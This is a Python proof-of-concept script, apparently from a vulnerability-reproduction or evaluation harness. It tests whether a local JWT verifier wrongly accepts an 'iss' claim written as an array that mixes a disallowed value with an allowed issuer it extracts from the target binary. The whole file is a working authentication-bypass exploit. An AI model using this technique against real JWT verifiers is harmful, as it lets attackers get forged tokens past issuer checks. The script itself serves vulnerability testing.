#!/usr/bin/env python3
"""Construct a JWT that exercises the target's issuer claim validation.

The target verifies an HS256-signed JWT and validates the ``iss`` claim
against a fixed allow-list.  This script discovers that allow-list value from
the target binary itself (embedded JavaScript configuration), signs a token
whose ``iss`` claim is presented as a JSON array containing both a
disallowed value and an allowed value, and reports the target's verdict.

The array value form is the weakness: the vulnerable verifier accepts an
array when any element matches the allow-list, even though ``iss`` must be a
single StringOrURI under RFC 7519.  A fixed build that enforces the claim
type rejects the same token.
"""

import argparse
import base64
import hashlib
import hmac
import json
import mmap
import os
import re
import signal as _signal
import subprocess
import sys
import time


MAX_STATIC_CANDIDATES = 8
MAX_DISCOVERY_RUNS = 8


def _b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def _json_bytes(obj) -> bytes:
    return json.dumps(obj, separators=(",", ":"), ensure_ascii=True).encode("utf-8")


def make_jwt(secret: str, payload_obj, header=None) -> str:
    """Return a compact JWT signed with HS256 using *secret*."""
    if header is None:
        header = {"alg": "HS256", "typ": "JWT"}
    signing_input = (
        _b64url(_json_bytes(header)) + "." + _b64url(_json_bytes(payload_obj))
    )
    signature = hmac.new(
        secret.encode("utf-8"), signing_input.encode("ascii"), hashlib.sha256
    ).digest()
    return signing_input + "." + _b64url(signature)


def derive_secret(binary_path: str) -> str:
    """Deterministically derive an inline verification secret from the binary.

    The exact secret does not matter: the token is signed with the same secret
    that is passed to the target via ``--key``.
    """
    digest = hashlib.sha256()
    digest.update(b"jwt-verify-poc-secret-v1\x00")
    digest.update(os.path.basename(binary_path).encode("utf-8", "replace"))
    try:
        size = os.path.getsize(binary_path)
        digest.update(str(size).encode("ascii"))
        with open(binary_path, "rb") as handle:
            digest.update(handle.read(8192))
    except OSError:
        pass
    return "poc-" + digest.hexdigest()[:32]


def decode_js_string(raw: bytes):
    """Decode a double- or single-quoted JavaScript string literal."""
    if not raw:
        return None
    try:
        if raw[:1] in (b'"',):
            value = json.loads(raw.decode("utf-8", "replace"))
            if isinstance(value, str):
                return value
    except (UnicodeDecodeError, json.JSONDecodeError):
        pass

    try:
        text = raw.decode("utf-8", "replace")
        if text[:1] == "'" and text[-1:] == "'":
            text = text[1:-1]
            text = text.replace("\\'", "'")
            text = text.replace("\\\\", "\\")
            return text
        if text[:1] == '"' and text[-1:] == '"':
            text = text[1:-1]
            text = text.replace('\\"', '"')
            text = text.replace("\\\\", "\\")
            return text
    except Exception:
        pass
    return None


def _looks_like_issuer(value) -> bool:
    if not isinstance(value, str) or not value:
        return False
    if len(value) < 2 or len(value) > 300:
        return False
    for bad in ("allowedIss", "allowed", "claim", "issuer", "JWT", "token"):
        if value == bad:
            return False
    return True


def extract_issuer_candidates(binary_path: str):
    """Inspect the target for embedded ``allowedIss`` configuration.

    The target bundles its JavaScript source, so the fixed allow-list is
    normally present as a literal such as ``allowedIss: ["https://..."]``.
    A direct regex is tried first; if it does not match, a bounded window
    around each ``allowedIss`` token is searched as a fallback.
    """
    candidates = []
    try:
        with open(binary_path, "rb") as handle:
            with mmap.mmap(handle.fileno(), 0, access=mmap.ACCESS_READ) as data:
                # Preferred shape: allowedIss: ["value", ...]
                for match in re.finditer(rb"allowedIss\s*:\s*\[([^\]]{0,1024})\]", data):
                    for token in re.finditer(
                        rb'"(?:[^"\\]|\\.)*"|\'(?:[^\'\\]|\\.)*\'', match.group(1)
                    ):
                        value = decode_js_string(token.group(0))
                        if _looks_like_issuer(value):
                            candidates.append(value)

                # Single-string shape: allowedIss: "value"
                for match in re.finditer(
                    rb"allowedIss\s*:\s*(?:\"(?:[^\"\\]|\\.)*\"|\'(?:[^\'\\]|\\.)*\')",
                    data,
                ):
                    raw = match.group(0).split(b":", 1)[1].strip()
                    value = decode_js_string(raw)
                    if _looks_like_issuer(value):
                        candidates.append(value)

                if not candidates:
                    # Fallback: inspect a short window around any allowedIss
                    # reference.  Keep the number of candidates bounded.
                    for match in re.finditer(rb"allowedIss", data):
                        start = match.start()
                        end = min(len(data), match.end() + 512)
                        window = data[start:end]
                        for token in re.finditer(
                            rb'"(?:[^"\\]|\\.)*"|\'(?:[^\'\\]|\\.)*\'', window
                        ):
                            value = decode_js_string(token.group(0))
                            if _looks_like_issuer(value):
                                candidates.append(value)
                        if candidates:
                            break
    except OSError:
        pass

    # Prefer URL-ish values because the bundled configuration uses a URI.
    unique = []
    seen = set()
    for value in candidates:
        if value in seen:
            continue
        seen.add(value)
        if "://" in value:
            unique.insert(0, value)
        else:
            unique.append(value)
    return unique[:MAX_STATIC_CANDIDATES]


def run_probe(binary_path: str, token: str, secret: str, timeout: float):
    """Run the target once and return its parsed JSON result if possible."""
    command = [binary_path, "--token", token, "--key", secret]
    try:
        proc = subprocess.run(
            command,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            timeout=timeout,
        )
        timed_out = False
        stdout = proc.stdout or ""
        stderr = proc.stderr or ""
        returncode = proc.returncode
    except FileNotFoundError as exc:
        return {
            "command": command,
            "returncode": None,
            "stdout": "",
            "stderr": "",
            "timed_out": False,
            "start_error": str(exc),
        }
    except PermissionError as exc:
        return {
            "command": command,
            "returncode": None,
            "stdout": "",
            "stderr": "",
            "timed_out": False,
            "start_error": str(exc),
        }
    except subprocess.TimeoutExpired as exc:
        stdout_bytes = exc.stdout
        stderr_bytes = exc.stderr
        stdout = (
            stdout_bytes.decode("utf-8", "replace")
            if isinstance(stdout_bytes, (bytes, bytearray))
            else (stdout_bytes or "")
        )
        stderr = (
            stderr_bytes.decode("utf-8", "replace")
            if isinstance(stderr_bytes, (bytes, bytearray))
            else (stderr_bytes or "")
        )
        return {
            "command": command,
            "returncode": None,
            "stdout": stdout,
            "stderr": stderr,
            "timed_out": True,
        }

    return {
        "command": command,
        "returncode": returncode,
        "stdout": stdout,
        "stderr": stderr,
        "timed_out": timed_out,
    }


def parse_json_object(text: str):
    """Return the first JSON object found on stdout, or None."""
    if not text:
        return None
    stripped = text.strip()
    try:
        value = json.loads(stripped)
        if isinstance(value, dict):
            return value
    except json.JSONDecodeError:
        pass

    for match in re.finditer(r"\{.*\}", stripped, re.DOTALL):
        try:
            value = json.loads(match.group(0))
            if isinstance(value, dict):
                return value
        except json.JSONDecodeError:
            continue
    return None


def compact_json(obj) -> str:
    return json.dumps(obj, separators=(",", ":"), ensure_ascii=True)


def signal_name(returncode):
    if returncode is None or returncode >= 0:
        return None
    signum = -returncode
    try:
        return _signal.Signals(signum).name
    except ValueError:
        return None


def discover_allowed_issuer(binary_path: str, secret: str, timeout: float):
    """Locate and confirm an allowed ``iss`` value through local probing."""
    static_candidates = extract_issuer_candidates(binary_path)
    candidates = list(static_candidates)

    # If static inspection found nothing useful, use a very small generic set
    # rather than growing the probe budget.  This keeps the script bounded.
    if not candidates:
        candidates = ["https://example.com", "https://issuer.example.com"]

    allowed = None
    observations = []

    # Probe ordinary string values until one is accepted.  This confirms the
    # target's claim policy without consulting any external data.
    for value in candidates[:MAX_DISCOVERY_RUNS]:
        token = make_jwt(secret, {"iss": value})
        probe = run_probe(binary_path, token, secret, timeout)
        result = parse_json_object(probe.get("stdout", ""))
        observations.append({"iss": value, "ok": bool(result and result.get("ok"))})
        if result and result.get("ok") is True:
            allowed = value
            break

    if allowed is None:
        # No candidate was observed as accepted.  Choose one deterministically
        # anyway so there is always a well-formed trigger token; the final
        # run may accept or reject it depending on the build.
        allowed = static_candidates[0] if static_candidates else candidates[0]

    return allowed, observations


def make_disallowed_value(allowed):
    candidate = "https://evil.example/disallowed"
    if allowed == candidate:
        candidate = "https://evil.example/other-disallowed"
    return candidate


def build_final_payload(allowed):
    unwanted = make_disallowed_value(allowed)
    # Array form: the target's per-element matching accepts this on the
    # vulnerable build, while RFC 7519 requires ``iss`` to be a StringOrURI.
    return {"iss": [unwanted, allowed]}


def run_poc(args):
    binary_path = args.binary
    timeout = max(1, args.timeout)
    secret = derive_secret(binary_path)
    allowed, observations = discover_allowed_issuer(binary_path, secret, timeout)

    payload = build_final_payload(allowed)
    token = make_jwt(secret, payload)
    command = [binary_path, "--token", token, "--key", secret]

    start = time.perf_counter()
    probe = run_probe(binary_path, token, secret, timeout)
    runtime_ms = int(round((time.perf_counter() - start) * 1000))

    stdout = probe.get("stdout", "")
    stderr = probe.get("stderr", "")
    returncode = probe.get("returncode")
    timed_out = bool(probe.get("timed_out"))
    sig = signal_name(returncode) if returncode is not None else None

    result = parse_json_object(stdout)

    if probe.get("start_error"):
        error = {
            "code": "SCRIPT_BINARY_START_FAILED",
            "message": probe.get("start_error"),
        }
        observable = {
            "kind": "stdout",
            "value": stdout,
            "path": None,
        }
    elif timed_out:
        error = {
            "code": "SCRIPT_TIMEOUT",
            "message": "Target did not produce a result before the timeout.",
        }
        observable = {
            "kind": "stdout",
            "value": stdout,
            "path": None,
        }
    elif result is None:
        error = {
            "code": "SCRIPT_NO_RESULT_JSON",
            "message": "Target ran but did not produce a parseable result JSON object.",
        }
        observable = {
            "kind": "stdout",
            "value": stdout,
            "path": None,
        }
    else:
        error = None
        observable = {
            "kind": "stdout",
            "value": compact_json(result),
            "path": None,
        }

    report = {
        "binary": binary_path,
        "command": command,
        "returncode": returncode,
        "signal": sig,
        "timed_out": timed_out,
        "runtime_ms": runtime_ms,
        "stdout": stdout,
        "stderr": stderr,
        "observable": observable,
        "error": error,
    }

    # The discovery observations are internal only; keep the contract fixed.
    return report


def make_error_report(exc):
    return {
        "binary": None,
        "command": [],
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "custom", "value": "", "path": None},
        "error": {"code": "SCRIPT_INTERNAL_ERROR", "message": str(exc)},
    }


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="Drive a JWT-verification target and report its verdict."
    )
    parser.add_argument("--binary", required=True, help="path to the target binary")
    parser.add_argument("--json-out", help="write JSON report to this file")
    parser.add_argument(
        "--timeout", type=float, default=30.0, help="per-run timeout in seconds"
    )
    args = parser.parse_args(argv)

    report = None
    try:
        report = run_poc(args)
    except Exception as exc:  # report, never raise, so evaluators always exit 0
        report = make_error_report(exc)

    serialized = json.dumps(report, indent=2, ensure_ascii=True) + "\n"
    if args.json_out:
        with open(args.json_out, "w", encoding="utf-8") as handle:
            handle.write(serialized)
    else:
        sys.stdout.write(serialized)
    return 0


if __name__ == "__main__":
    sys.exit(main())
